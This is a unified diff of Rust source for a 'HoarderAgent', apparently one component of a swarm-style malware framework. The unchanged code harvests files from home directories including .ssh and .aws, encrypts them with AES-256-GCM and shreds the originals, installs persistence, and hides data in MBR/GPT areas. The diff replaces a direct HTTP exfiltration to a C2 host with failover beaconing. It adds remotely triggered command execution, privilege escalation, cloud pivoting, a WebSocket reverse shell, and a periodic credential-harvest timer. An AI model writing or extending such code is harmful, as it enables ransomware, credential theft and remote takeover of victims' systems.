@@ -6,6 +6,7 @@ use std::time::Duration;
 use tokio::time;
 use tracing::{info, warn};
 use uuid::Uuid;
+use serde_json;
 use aes_gcm::{Aes256Gcm, Key, Nonce};
 use aes_gcm::aead::{Aead, KeyInit};
 use rand::Rng;
@@ -26,6 +27,7 @@ struct HoarderAgent {
     encryption_key: Option<Vec<u8>>,
     safe_mode: bool,
     throttle_ms: u64,
+    interactive_shell: Option<hive_base::remote_shell::WsShell>,
 }
 
 impl HoarderAgent {
@@ -65,15 +67,20 @@ impl HoarderAgent {
             encryption_key: None,
             safe_mode,
             throttle_ms: 100,
+            interactive_shell: None,
         };
 
-        // Phoenix: Install persistence mechanisms on startup
         agent.install_phoenix_persistence();
-
-        // Phoenix: Generate and hide genome fragments
         agent.setup_phoenix_genome();
+        agent.calibrate_opsec();
 
         agent
+    }
+
+    fn calibrate_opsec(&self) {
+        let profile = hive_base::smoke_signals::learn_org_profile();
+        self.comms.calibrate_opsec(&profile);
+        info!("OPSEC: calibrated from org profile");
     }
 
     fn install_phoenix_persistence(&mut self) {
@@ -90,8 +97,6 @@ impl HoarderAgent {
 
     fn setup_phoenix_genome(&mut self) {
         let base_path = std::env::temp_dir();
-
-        // Create AgentBlueprint for honeybee itself
         let exe_path = std::env::current_exe();
         let binary_hash = exe_path.as_ref()
             .ok()
@@ -116,14 +121,12 @@ impl HoarderAgent {
             binary_hash,
             binary_size,
             policy: policies,
-            encrypted_chunk: vec![], // will be set by fragment_genome
+            encrypted_chunk: vec![],
         };
 
-        // Generate genome and fragment it
         let genome = Phoenix::generate_genome(vec![blueprint]);
         let mut fragments = Phoenix::fragment_genome(&genome, 3);
 
-        // Hide each fragment with MbrGpt location (user specified override)
         for f in &mut fragments {
             f.location = FragmentLocation::MbrGpt;
             match Phoenix::hide(f, &base_path) {
@@ -137,7 +140,6 @@ impl HoarderAgent {
         let mut targets = Vec::new();
         let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
 
-        // Common valuable directories
         for dir in &["Documents", "Desktop", "Downloads", ".ssh", ".aws", ".config"] {
             let path = PathBuf::from(&home).join(dir);
             if path.exists() {
@@ -145,7 +147,6 @@ impl HoarderAgent {
             }
         }
 
-        // Mount points with data
         for mp in &["/mnt", "/media", "/var/lib"] {
             if PathBuf::from(mp).exists() {
                 targets.push(PathBuf::from(mp));
@@ -163,8 +164,6 @@ impl HoarderAgent {
         self.comms.send_heartbeat().await;
     }
 
-    // ── Real encryption (AES-256-GCM) ────────────────────────────────────
-
     fn encrypt_file(&self, path: &PathBuf, key: &[u8; 32]) -> Result<u64, String> {
         let data = std::fs::read(path)
             .map_err(|e| format!("read {}: {}", path.display(), e))?;
@@ -177,7 +176,6 @@ impl HoarderAgent {
         let ciphertext = cipher.encrypt(nonce, data.as_slice())
             .map_err(|e| format!("encrypt {}: {}", path.display(), e))?;
 
-        // Write: nonce (12) + ciphertext
         let mut output = Vec::with_capacity(12 + ciphertext.len());
         output.extend_from_slice(&nonce_bytes);
         output.extend_from_slice(&ciphertext);
@@ -193,7 +191,6 @@ impl HoarderAgent {
             .map_err(|e| format!("stat {}: {}", path.display(), e))?;
         let size = metadata.len();
 
-        // Overwrite 3 passes with random data, then zeros
         for _ in 0..3 {
             let random: Vec<u8> = (0..size).map(|_| rand::thread_rng().gen()).collect();
             std::fs::write(path, &random)
@@ -211,8 +208,6 @@ impl HoarderAgent {
 
         Ok(size)
     }
-
-    // ── Real action execution ────────────────────────────────────────────
 
     async fn execute_encrypt(&mut self) {
         if self.safe_mode {
@@ -284,76 +279,50 @@ impl HoarderAgent {
         }
         let mut total_bytes = 0u64;
 
-        // Chrononaut: plant time capsules before exfil
         let _ = self.plant_chrononaut_capsules().await;
 
         for path in &self.target_paths {
             if path.is_file() && path.metadata().map(|m| m.len()).unwrap_or(0) < 10_000_000 {
                 if let Ok(data) = std::fs::read(path) {
-                    let c2_url = std::env::var("HIVE_C2_URL")
-                        .unwrap_or_else(|_| "https://c2.swarm.local/collect".into());
+                    // Use failover C2 channels instead of raw HTTP
+                    let sent = self.comms.send_beacon_c2(&data).await;
+                    if sent {
+                        total_bytes += data.len() as u64;
+                        info!("Exfiltrated: {} ({} bytes)", path.display(), data.len());
 
-                    let client = reqwest::Client::builder()
-                        .timeout(Duration::from_secs(30))
-                        .danger_accept_invalid_certs(true)
-                        .build();
-
-                    if let Ok(client) = client {
                         let filename = path.file_name()
                             .map(|n| n.to_string_lossy().to_string())
                             .unwrap_or_else(|| "data".into());
 
-                        match client.post(&c2_url)
-                            .header("X-File-Name", &filename)
-                            .body(data)
-                            .send()
-                            .await
-                        {
-                            Ok(resp) => {
-                                if resp.status().is_success() {
-                                    total_bytes += resp.content_length().unwrap_or(0);
-                                    info!("Exfiltrated: {} ({} bytes)", path.display(),
-                                        path.metadata().map(|m| m.len()).unwrap_or(0));
-
-                                    // WhisperNet: relay exfil notification through P2P mesh
-                                    let relay_data = format!("exfil:{}:{}b", filename,
-                                        path.metadata().map(|m| m.len()).unwrap_or(0));
-                                    let wmsg = hive_base::whispernet::WhisperMessage {
-                                        msg_id: Uuid::new_v4(),
-                                        sender_id: self.identity.id(),
-                                        seq: 0,
-                                        payload: relay_data.into_bytes(),
-                                        ttl: self.whispernet.config().max_hops,
-                                        signature: vec![],
-                                        timestamp: hive_base::utils::timestamp_now(),
-                                    };
-                                    if self.whispernet.send_message(wmsg).await.is_ok() {
-                                        info!("WhisperNet: relayed exfil notification for {}", filename);
-                                    }
-
-                                    // Phoenix: hide recovery fragment in BadBlocks to mark exfil
-                                    let file_size = path.metadata().map(|m| m.len()).unwrap_or(0);
-                                    let exfil_data = format!("exfil:{}:{}b:{}", filename, file_size,
-                                        hive_base::utils::timestamp_now());
-                                    let mut recovery_fragment = GenomeFragment {
-                                        fragment_id: total_bytes as u32,
-                                        total_fragments: 1,
-                                        genome_id: Uuid::nil(),
-                                        data: exfil_data.into_bytes(),
-                                        location: FragmentLocation::BadBlocks,
-                                        stored_path: None,
-                                    };
-                                    let base_path = std::env::temp_dir();
-                                    let _ = Phoenix::hide(&mut recovery_fragment, &base_path);
-                                    info!("Phoenix: recovery fragment hidden for exfil {}", filename);
-                                } else {
-                                    warn!("C2 rejected: {} (HTTP {})", path.display(), resp.status());
-                                }
-                            }
-                            Err(e) => {
-                                warn!("C2 unreachable for {}: {}", path.display(), e);
-                            }
+                        let relay_data = format!("exfil:{}:{}b", filename, data.len());
+                        let wmsg = hive_base::whispernet::WhisperMessage {
+                            msg_id: Uuid::new_v4(),
+                            sender_id: self.identity.id(),
+                            seq: 0,
+                            payload: relay_data.into_bytes(),
+                            ttl: self.whispernet.config().max_hops,
+                            signature: vec![],
+                            timestamp: hive_base::utils::timestamp_now(),
+                        };
+                        if self.whispernet.send_message(wmsg).await.is_ok() {
+                            info!("WhisperNet: relayed exfil notification for {}", filename);
                         }
+
+                        let exfil_data = format!("exfil:{}:{}b:{}", filename, data.len(),
+                            hive_base::utils::timestamp_now());
+                        let mut recovery_fragment = GenomeFragment {
+                            fragment_id: total_bytes as u32,
+                            total_fragments: 1,
+                            genome_id: Uuid::nil(),
+                            data: exfil_data.into_bytes(),
+                            location: FragmentLocation::BadBlocks,
+                            stored_path: None,
+                        };
+                        let base_path = std::env::temp_dir();
+                        let _ = Phoenix::hide(&mut recovery_fragment, &base_path);
+                        info!("Phoenix: recovery fragment hidden for exfil {}", filename);
+                    } else {
+                        warn!("Exfil failed for {}: all C2 channels down", path.display());
                     }
                 }
             }
@@ -400,9 +369,6 @@ impl HoarderAgent {
         self.publish_msg(msg).await;
     }
 
-    // ── Event loop ───────────────────────────────────────────────────────
-
-    /// Plant chrononaut time capsules before exfiltration
     async fn plant_chrononaut_capsules(&self) -> Result<(), String> {
         let delayed_commands = ["reconnect_c2",
             "rotate_keys",
@@ -414,15 +380,13 @@ impl HoarderAgent {
             .map(|d| d.as_secs())
             .unwrap_or(0);
 
-        // Plant capsules into log files with future trigger times
         for (i, cmd) in delayed_commands.iter().enumerate() {
-            // Find a target file to encode the capsule in
             if let Some(path) = self.target_paths.iter().find(|p| {
                 p.extension().and_then(|e| e.to_str()) == Some("log")
             }) {
                 let capsule = hive_base::chrononaut::TimeCapsule {
                     capsule_id: Uuid::new_v4(),
-                    trigger_timestamp: now + 3600 * (i as u64 + 1), // 1-4 hours later
+                    trigger_timestamp: now + 3600 * (i as u64 + 1),
                     command: cmd.to_string(),
                     payload: vec![],
                     host_hint: "self".into(),
@@ -466,6 +430,69 @@ impl HoarderAgent {
                 Payload::StatusEvent { event_type, subject_id, .. } if event_type == "agent_dead" => {
                     warn!("Agent {} reported DEAD", subject_id);
                 }
+                Payload::Request { service, .. } if service == "privesc" => {
+                    info!("PRIVESC: escalation requested by Queen");
+                    let (attempted, success) = self.comms.escalate_privileges().await;
+                    if attempted && success {
+                        info!("PRIVESC: root achieved on Queen request");
+                    } else if attempted {
+                        info!("PRIVESC: escalation failed on Queen request");
+                    }
+                }
+                Payload::Request { service, payload } if service == "exec" => {
+                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
+                        let cmd = cmd_data["cmd"].as_str().unwrap_or("id").to_string();
+                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
+                        info!("EXEC: executing cmd_id={}: {}", cmd_id, cmd);
+                        let result = hive_base::remote_shell::execute_command(&cmd);
+                        let result_msg = Message::belief(
+                            self.identity.id(), Role::Honeybee,
+                            format!("exec:result:{}", cmd_id),
+                            hive_base::Value::String(format!(
+                                "exit={} duration={}ms stdout={} stderr={}",
+                                result.exit_code, result.duration_ms,
+                                result.stdout.trim().chars().take(500).collect::<String>(),
+                                result.stderr.trim().chars().take(200).collect::<String>(),
+                            )),
+                            if result.exit_code == 0 { 1.0 } else { 0.5 },
+                        );
+                        self.publish_msg(result_msg).await;
+                    }
+                }
+                Payload::Request { service, .. } if service == "cloud_pivot" => {
+                    info!("CLOUD: pivot requested by Queen — checking connectivity");
+                    if hive_base::cloud_worker::CloudWorker::check_connectivity() {
+                        let (executed, resources) = self.comms.pivot_cloud().await;
+                        if executed {
+                            info!("CLOUD: pivot complete — {} resources", resources);
+                        }
+                    } else {
+                        info!("CLOUD: no connectivity — skipping pivot");
+                    }
+                }
+                Payload::Request { service, payload } if service == "shell" => {
+                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
+                        let ws_url = cmd_data["url"].as_str().unwrap_or("ws://127.0.0.1:9000/shell");
+                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
+                        info!("SHELL: starting interactive shell -> {}", ws_url);
+                        let shell = hive_base::remote_shell::WsShell::start(ws_url);
+                        let prev = self.interactive_shell.replace(shell);
+                        if let Some(mut old) = prev { old.stop(); }
+                        let result_msg = Message::belief(
+                            self.identity.id(), Role::Honeybee,
+                            format!("shell:result:{}", cmd_id),
+                            hive_base::Value::String("started".into()),
+                            1.0,
+                        );
+                        self.publish_msg(result_msg).await;
+                    }
+                }
+                Payload::Request { service, .. } if service == "shell_stop" => {
+                    info!("SHELL: stopping interactive shell");
+                    if let Some(mut shell) = self.interactive_shell.take() {
+                        shell.stop();
+                    }
+                }
                 _ => {}
             }
 
@@ -476,7 +503,6 @@ impl HoarderAgent {
                             pid, ratio, total);
                         self.state = HoarderState::Executing;
 
-                        // Find the proposal action to determine what to execute
                         if let Some(record) = self.consensus.proposals.get(&pid) {
                             let action = record.action.to_lowercase();
                             info!("Executing: {} (consensus confirmed)", action);
@@ -496,8 +522,6 @@ impl HoarderAgent {
         }
     }
 
-    /// Check pending consensus proposals even without new messages.
-    /// This ensures proposals that have enough votes don't wait for new messages.
     async fn check_pending_consensus(&mut self) {
         for pid in self.active_proposals.clone() {
             if let Some((reached, ratio, total)) = self.consensus.check_consensus(&pid) {
@@ -506,7 +530,6 @@ impl HoarderAgent {
                         pid, ratio, total);
                     self.state = HoarderState::Executing;
 
-                    // Find the proposal action to determine what to execute
                     if let Some(record) = self.consensus.proposals.get(&pid) {
                         let action = record.action.to_lowercase();
                         info!("Executing: {} (consensus confirmed via timer)", action);
@@ -535,6 +558,7 @@ impl HoarderAgent {
         let mut heartbeat_timer = time::interval(self.heartbeat_interval);
         let mut whisper_timer = time::interval(Duration::from_secs(60));
         let mut consensus_timer = time::interval(Duration::from_secs(30));
+        let mut leech_timer = time::interval(Duration::from_secs(1800));
 
         loop {
             tokio::select! {
@@ -546,6 +570,10 @@ impl HoarderAgent {
                 }
                 _ = consensus_timer.tick() => {
                     self.check_pending_consensus().await;
+                }
+                _ = leech_timer.tick() => {
+                    info!("LEECH: queuing credential harvest cycle");
+                    self.comms.send_harvest().await;
                 }
                 _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
             }
